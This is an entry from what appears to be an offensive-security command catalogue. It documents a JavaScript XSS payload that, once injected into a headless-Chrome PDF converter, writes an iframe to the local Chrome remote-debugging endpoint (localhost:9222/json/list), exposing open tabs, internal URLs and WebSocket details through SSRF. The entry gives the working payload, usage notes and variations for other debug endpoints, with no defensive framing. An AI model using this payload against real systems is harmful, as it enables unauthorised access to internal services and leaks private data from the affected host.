---
data: >-
  window.onload=function(){ document.write('<iframe
  src="http://localhost:9222/json/list" width="100%" height="100%"></iframe>');
  };
tags:
  - ssrf
  - iframe
  - xss
type: command
output: 'Loads JSON list of tabs, revealing internal URLs like secret document'
executor: javascript
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T04:39:10.006Z'
id: 72b44679-de2e-4963-b38d-3b65376b3874
verified: false
validated: true
submitted: true
---
# create-iframe-ssrf-chrome

## Command

```javascript
window.onload=function(){ document.write('<iframe src="http://localhost:9222/json/list" width="100%" height="100%"></iframe>'); };
```

## Description

JavaScript payload injected via XSS in PDF converter to dynamically write an iframe sourcing the headless Chrome remote debugging endpoint, enabling SSRF to localhost:9222.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | URL to Chrome debug endpoint (http://localhost:9222/json/list) | Yes |

## Examples

### Basic Usage

Execute in browser console or via XSS.

### Advanced Usage

Modify src for other debug endpoints like /json.

## Expected Output

Iframe content displays JSON of open tabs with URLs and WebSocket details.

## Related

- [[commands/get-chrome-debug-json-list]]
- [[procedures/SSRF-via-Iframe-to-Headless-Chrome-Debugging-Port]]
